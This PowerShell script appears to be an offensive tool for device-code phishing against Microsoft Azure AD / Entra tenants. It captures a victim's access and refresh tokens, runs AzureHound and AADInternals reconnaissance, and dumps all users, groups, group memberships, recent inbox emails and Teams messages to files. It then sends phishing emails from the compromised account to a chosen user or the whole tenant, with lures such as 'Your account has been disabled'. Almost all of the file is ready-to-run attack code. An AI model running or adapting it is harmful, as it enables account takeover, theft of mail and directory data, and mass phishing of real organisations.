[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Token,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$template
)

# # Check if AADInternals module is available
# if (-not (Get-Module -Name AADInternals -ListAvailable)) {
#     # Install the AADInternals module if it's not available
#     Install-Module AADInternals -Force
#     Write-Output "AADInternals module has been installed."
# }

# Import the AADInternals module
# Import-Module AADInternals -Force
# Write-Output "AADInternals module has been imported."

# # Check if TokenTactics module is available
# if (!(Get-Module -ListAvailable -Name TokenTactics)) {
#     # Download the latest TokenTactics zip if the module is not available
#     Write-Output "TokenTactics not found, downloading latest version into current working directory."
#     Invoke-WebRequest -Uri https://github.com/mellonaut/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip

#     if (Test-Path -Path .\tokentactics) {
#         Remove-Item -Path .\tokentactics -Recurse -Force
#     }

#     Expand-Archive -LiteralPath .\tokentactics.zip -DestinationPath .\tokentactics -Force
#     Get-ChildItem -Path .\tokentactics\tokentactics-main\* -Recurse | Move-Item -Destination .\tokentactics -Force
#     Remove-Item -Path .\tokentactics\tokentactics-main -Recurse -Force
# }

# Import or re-import the TokenTactics module
# Import-Module .\tokentactics\TokenTactics.psd1 -Force
# Write-Output "TokenTactics module has been imported."


# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Invoke-ClearToken -Token All
    Write-Output "Clearing any previous tokens for a clean run."
    Get-AzureToken -Client Graph    
} else {
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    Get-AzureToken -Client Graph -CaptureCode $Token
}


# Loot
if(!($response)){ Write-Host "Users on the hook.."} else {
$access = $response.access_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."
$switch = "$user"
$switch | Out-File -Path .\switch.txt 

# Assuming $response and $domain are already set
$tok = $response.refresh_token

# Azure hound bins
# Determine the operating system using the OS environment variable
$osType = $env:OS
$binaryName = ""
$exePath = ""

if ($osType -eq "Windows_NT") {
    $os = "windows"
    Write-Output "Detected Windows OS."
    $binaryName = "azurehound-windows-amd64.zip"
    $exePath = ".\azurehound.exe"
} else {
    $os = "linux"
    Write-Output "Detected Linux OS."
    $binaryName = "azurehound-linux-amd64.zip"
    $exePath = "./azurehound"
}

# Define the output path
$outputZipFile = $binaryName

# Check if the binary already exists and delete it if it does
if (Test-Path -Path $outputZipFile) {
    Remove-Item -Path $outputZipFile -Force
    Write-Output "Existing AzureHound binary deleted."
}

# Download the correct AzureHound binary for the detected OS
$downloadUrl = "https://github.com/BloodHoundAD/AzureHound/releases/latest/download/$binaryName"
Invoke-WebRequest -Uri $downloadUrl -OutFile $outputZipFile
Write-Output "Downloaded the AzureHound binary for $os."

# Expand the downloaded zip file
Expand-Archive -LiteralPath $outputZipFile -DestinationPath . -Force
Write-Output "Extracted the AzureHound binary."

# Clean up the zip file
Remove-Item -Path $outputZipFile -Force
Write-Output "Cleaned up the downloaded zip file."

# Run AzureHound with the specified parameters
Write-Output "Running Azurehound."
& $exePath -r $tok list --tenant $domain -o azurehound.json
Write-Output "AzureHound command executed for $os."


# AADInternals Initial Recon
Write-Output "Invoking AADInternals recon as insider"
$core=Invoke-RefreshToAzureCoreManagementToken -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
$results = Invoke-AADIntReconAsInsider
$jsonContent = $results | ConvertTo-Json
$jsonContent | Out-File -FilePath "intrecon.json"

# User and Group Enumeration
Write-Output "Invoking AADInternals User and Group enumeration"
$userEnum = Invoke-AADIntUserEnumerationAsInsider
$jsonContent = $userEnum | ConvertTo-Json
$jsonContent | Out-File -FilePath "userEnum.json"

# AzAD Group memberships
Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user

# Users
# Retrieve all users
Write-Output "Dumping users for later steps"
$users = Get-AzureADUser -All $true
$jsonContent = $users | ConvertTo-Json
$jsonContent | Out-File -FilePath "users.json"

# Retrieve all groups
Write-Output "Dumping groups"
$groups = Get-AzureADGroup -All $true
$jsonContent = $groups | ConvertTo-Json
$jsonContent | Out-File -FilePath "groups.json"

# Create an empty array to store group and member information
$groupData = @()

# Iterate over each group and retrieve its members
foreach ($group in $groups) {
    $groupInfo = [ordered]@{
        GroupName = $group.DisplayName
        Members = @()
    }

    # Retrieve members of the group
    $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true

    # Add members to group info
    foreach ($member in $members) {
        $groupInfo.Members += $member.DisplayName
    }

    # Add group info to the array
    $groupData += $groupInfo
}
$jsonData = $groupData | ConvertTo-Json
$jsonData | Out-File -FilePath "members.json"

# Email

### Refresh to Graph, Dump emails
Write-Output "Dumping last 200 emails from inbox"
Invoke-RefreshToMSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
$emails = Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -Device iPhone -Browser Safari -Top 200
$jsonData = $emails | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.emails.json"

### Get Teams Token and export for AADInternals
$teams=Invoke-RefreshToMSTeamsToken -refreshToken $response.refresh_token -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $teams.access_token -RefreshToken $teams.refresh_token

### Export TeamsMessages
Write-Output "Dumping Teams messages"
$msgs = Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName 

### Convert the chats to JSON
$jsonData = $msgs | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.teams.json"

### Delay between retries (in seconds)
$retryDelay = 5

### Phishing Message Content

$At=Invoke-RefreshToOutlookToken -domain $domain -refreshtoken $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.refresh_token

### Teams Messages - Send over Teams
# $teamsMessage = @{
#     Body = @{
#         ContentType = "html"
#         Content = $messageContent
#     }
# }

$teamsMessage = $messageContent


### Teams Messages - Function to handle message sending with retry logic
function Send-TeamsMessageWithRetry {
    param(
        [string]$Recipient,
        [hashtable]$teamsMessage
    )

    $retryCount = 0
    $maxRetries = 3
    $retryDelay = 5

    while ($retryCount -lt $maxRetries) {
        try {
            Send-AADIntTeamsMessage -Recipients $Recipient -Message $Message
            Write-Host "Message sent to $Recipient successfully."
            return
        } catch {
            Write-Host "Error sending message to $Recipient. Retrying in $retryDelay seconds..."
            Start-Sleep -Seconds $retryDelay
            $retryCount++
        }
    }

    Write-Host "Failed to send message to $Recipient after $maxRetries attempts."
}

### Conditional logic for Sending Messages
if ($targetUser) {
    if ($targetUser -eq "all") {
        foreach ($user in $users) {
            Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
            Write-Output "You like to party."
            Write-Output "Setting status message to 'Gone Phishin' and going wide."
            Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
            
            Write-Output "Sending messages..."
            # Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject "Your account has been disabled" -Message $teamsMessage
        }
    } else {
        Write-Output "Setting user status message to 'Gone Phishin'"
        Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
        # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
        Write-Output "Sending message..."        
        $mailuser = $targetUser
        if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
        if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
    }
} else {
    Write-Host "No Teams user specified. Skipping message sending."
}
}





# Open Mailbox in browser with Burp, paste into repeater
# Write-Output "Would you like to open the user's mailbox in the browser?"
# Read-Host "Press enter for instructions or Ctrl+C to cancel"
# Write-Output "Microsoft patched part of the TokenTactics version, use these instruction for a workaround: https://labs.lares.com/owa-cap-bypass/"
# Invoke-RefreshToSubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
# Invoke-OpenOWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device iPhone -Browser Edge
